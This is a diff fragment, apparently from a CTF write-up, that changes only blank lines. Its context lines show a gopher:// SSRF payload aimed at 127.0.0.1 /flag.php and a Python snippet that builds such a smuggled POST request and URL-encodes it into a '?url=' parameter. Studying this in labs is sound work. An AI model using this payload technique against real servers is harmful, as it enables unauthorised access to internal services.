@@ -774,7 +774,7 @@ gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250d%250AHost:%2520127.0.
 ```python
 import urllib.parse
 
- 
+
 
 payload = """POST /flag.php HTTP/1.1
 
@@ -792,13 +792,13 @@ print(payload)
 
 print()
 
- 
+
 
 payload = payload.replace("\n", "\r\n")
 
 gopher_payload = f"gopher://127.0.0.1:80/_{urllib.parse.quote(payload)}"
 
- 
+
 
 print("[+] Gopher URL:")
 
@@ -808,7 +808,7 @@ print()
 
  
 
- 
+
 
 final_url = f"?url={urllib.parse.quote(gopher_payload)}"
 
